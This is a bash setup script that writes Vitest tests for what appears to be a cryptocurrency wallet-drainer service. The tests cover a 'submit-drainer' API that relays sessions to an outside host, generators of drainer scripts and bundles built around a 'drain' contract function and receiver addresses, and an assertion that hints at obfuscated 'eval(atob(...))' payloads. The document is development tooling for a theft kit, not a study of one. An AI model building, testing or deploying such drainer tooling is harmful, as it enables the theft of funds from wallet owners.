#!/bin/bash
# create-test-harness.sh
# Run this script once to set up Vitest and test files.

set -e  # exit on error

echo "Setting up test harness..."

# 1. Install Vitest if not present
if ! grep -q '"vitest"' package.json; then
  echo "Installing vitest..."
  npm install -D vitest @vitest/coverage-v8 @vitest/ui
fi

# 2. Create test directory if it doesn't exist
mkdir -p test

# 3. Create vitest.config.ts
cat > vitest.config.ts << 'EOF'
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    environment: 'node',
    include: ['test/**/*.test.ts', 'app/**/*.test.ts'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'html'],
    },
  },
});
EOF

# 4. Create test files

cat > test/compile-validation.test.ts << 'EOF'
import { POST as compilePOST } from '@/app/api/compile/route';
import { NextRequest } from 'next/server';
import { describe, it, expect } from 'vitest';

describe('/api/compile - address validation', () => {
  it('rejects invalid contract address', async () => {
    const req = new NextRequest('http://localhost/api/compile', {
      method: 'POST',
      body: JSON.stringify({
        contractAddress: '0xinvalid',
        recipient: '0x0000000000000000000000000000000000000001',
      }),
    });
    const res = await compilePOST(req);
    expect(res.status).toBe(400);
    const json = await res.json();
    expect(json.error).toMatch(/Invalid/);
  });

  it('accepts valid addresses', async () => {
    const req = new NextRequest('http://localhost/api/compile', {
      method: 'POST',
      body: JSON.stringify({
        contractAddress: '0x0000000000000000000000000000000000000000',
        recipient: '0x0000000000000000000000000000000000000001',
      }),
    });
    const res = await compilePOST(req);
    // Since the route may try to compile, we expect it to either succeed or fail gracefully
    // We just check it doesn't return 400 for validation
    expect(res.status).not.toBe(400);
  });
});
EOF

cat > test/script-build-store.test.ts << 'EOF'
import { atomicWriteBuild, readBuild } from '@/lib/script-build-store';
import { promises as fs } from 'fs';
import path from 'path';
import { describe, it, expect, beforeAll, afterAll } from 'vitest';

const TEST_SESSION = 'test-session';
const TEST_CONTENT = 'console.log("hello");';

describe('script-build-store', () => {
  it('writes and reads atomically', async () => {
    await atomicWriteBuild(TEST_SESSION, TEST_CONTENT);
    const content = await readBuild(TEST_SESSION);
    expect(content).toBe(TEST_CONTENT);
  });

  afterAll(async () => {
    const filePath = path.join(process.cwd(), '.builds', `${TEST_SESSION}.js`);
    try {
      await fs.unlink(filePath);
    } catch {}
  });
});
EOF

cat > test/submit-drainer.test.ts << 'EOF'
import { POST as submitPOST } from '@/app/api/submit-drainer/route';
import { GET as submitGET } from '@/app/api/submit-drainer/route';
import { NextRequest } from 'next/server';
import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock fetch globally
const mockFetch = vi.fn().mockImplementation(() =>
  Promise.resolve({
    ok: true,
    json: () => Promise.resolve({ script: 'mocked' }),
  })
);
global.fetch = mockFetch as any;

beforeEach(() => {
  vi.clearAllMocks();
});

describe('/api/submit-drainer', () => {
  it('stores session locally and forwards optionally', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer', {
      method: 'POST',
      body: JSON.stringify({
        sessionId: 'test-123',
        tokenAddress: '0x0000000000000000000000000000000000000000',
        recipient: '0x0000000000000000000000000000000000000001',
        relay: true,
      }),
    });
    const res = await submitPOST(req);
    const json = await res.json();
    expect(json.success).toBe(true);
    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(mockFetch).toHaveBeenCalledWith(
      'https://d.v26sequence.com/api/compile/drainer',
      expect.objectContaining({ method: 'POST' })
    );
  });

  it('can retrieve session via GET', async () => {
    const req = new NextRequest('http://localhost/api/submit-drainer?sessionKey=test-123');
    const res = await submitGET(req);
    const json = await res.json();
    expect(json.found).toBe(true);
    expect(json.data).toBeDefined();
  });
});
EOF

cat > test/universal-sdk-generator.test.ts << 'EOF'
import { generateDrainerBundle } from '@/lib/universal-sdk-generator';
import { describe, it, expect } from 'vitest';

describe('universal-sdk-generator', () => {
  it('generates drainer bundle with contract address and ABI', () => {
    const bundle = generateDrainerBundle({
      contractAddress: '0x1234567890123456789012345678901234567890',
      receiver: '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
      backend: 'SomeBackend',
      abi: [{ type: 'function', name: 'drain', inputs: [{ name: 'to', type: 'address' }] }],
    });
    expect(bundle).toContain('0x1234567890123456789012345678901234567890');
    expect(bundle).toContain('drain');
    expect(bundle).toContain('function');
  });
});
EOF

cat > test/drainer-script-generator.test.ts << 'EOF'
import { generateDrainerScript } from '@/lib/drainer-script-generator';
import { describe, it, expect } from 'vitest';

describe('drainer-script-generator', () => {
  it('generates valid JavaScript with receiver and backend', () => {
    const script = generateDrainerScript({
      receiver: '0x1234567890123456789012345678901234567890',
      backend: '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
    });
    expect(script).toContain('0x1234567890123456789012345678901234567890');
    expect(script).toContain('0xabcdefabcdefabcdefabcdefabcdefabcdefabcd');
    // Check it's valid JS (no template artifacts)
    expect(script).not.toContain('|');
    expect(script).not.toContain('eval(atob(variableName))');
  });
});
EOF

# 5. Add test scripts to package.json (if not present)
if ! grep -q '"test"' package.json; then
  echo "Adding test scripts to package.json..."
  # Using jq would be cleaner, but we'll sed a simple insertion.
  # This is a bit hacky but works for typical package.json.
  sed -i.bak '/"scripts": {/a\
    "test": "vitest",\
    "test:watch": "vitest --watch",\
    "test:coverage": "vitest --coverage",\
    "test:ui": "vitest --ui"
' package.json
  rm -f package.json.bak
fi

echo "✅ Test harness created!"
echo "Run 'npm test' to execute tests."
